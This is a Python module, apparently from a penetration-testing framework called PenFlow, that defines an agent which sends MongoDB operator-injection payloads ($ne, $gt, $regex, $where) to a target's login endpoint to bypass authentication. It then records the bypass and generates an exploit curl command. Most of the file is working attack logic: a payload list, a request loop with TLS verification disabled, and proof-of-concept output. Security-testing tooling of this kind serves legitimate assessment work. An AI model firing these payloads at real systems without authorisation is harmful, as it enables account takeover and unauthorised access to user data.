"""
Pure NoSQL Injection Capability Agent for PenFlow.

Capabilities:
  - MongoDB Operator Injection ($gt, $ne, $regex, $where)
  - CouchDB / Redis NoSQL Operator Injection
  - Authentication Bypass via NoSQL JSON / Query Operators
"""
import httpx
from typing import Dict, Any, List, Optional
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.nosql_injection")

NOSQL_PAYLOADS = [
    {"username": "admin", "password": {"$ne": None}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": "admin", "password": {"$regex": "^a"}},
    {"$where": "this.username == 'admin'"}
]


class NoSQLInjectionAgent(BaseCapabilityAgent):
    """
    Capability Agent probing MongoDB, CouchDB, and Redis NoSQL query operator injections.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="NoSQLInjectionAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="nosql_injection", name="Pure NoSQL Injection", description="Detects MongoDB/CouchDB operator injections ($ne, $gt, $regex) leading to auth bypass", priority=self.priority, tags=["nosql", "mongodb", "injection"])
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        base_url = f"https://{context.asset}"
        login_url = f"{base_url}/api/v1/auth/login"

        try:
            async with httpx.AsyncClient(timeout=8.0, follow_redirects=False, verify=False) as client:
                for payload in NOSQL_PAYLOADS:
                    try:
                        resp = await client.post(login_url, json=payload)
                        if resp.status_code in (200, 201) and ("token" in resp.text.lower() or "success" in resp.text.lower()):
                            curl_cmd = f"curl -X POST '{login_url}' -H 'Content-Type: application/json' -d '{{\"username\": \"admin\", \"password\": {{\"$$ne\": null}}}}'"
                            exch_dict = {
                                "request": {"method": "POST", "url": login_url, "json_data": payload},
                                "response": {"status_code": resp.status_code, "body_snippet": resp.text[:500]}
                            }

                            findings.append({
                                "vulnerability_type": "nosql_injection",
                                "target_url": login_url,
                                "payload": payload,
                                "severity": "CRITICAL",
                                "confidence": 0.95,
                                "is_vulnerable": True,
                                "exploit_curl": curl_cmd,
                                "reproduction_steps": self.poc_generator.generate_reproduction_steps("NoSQL Operator Injection Auth Bypass", login_url, curl_cmd),
                                "description": f"NoSQL Operator Injection confirmed at '{login_url}': Authentication bypassed using query operator payload.",
                                "_exchange_obj": exch_dict
                            })
                            evidence["nosql_auth_bypass"] = True
                            break
                    except Exception as e:
                        logger.debug(f"NoSQL test failed on {login_url}: {e}")

        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")

        is_vuln = len(findings) > 0
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": 0.95 if is_vuln else 0.0,
            "confidence_score": 0.95 if is_vuln else 0.0,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
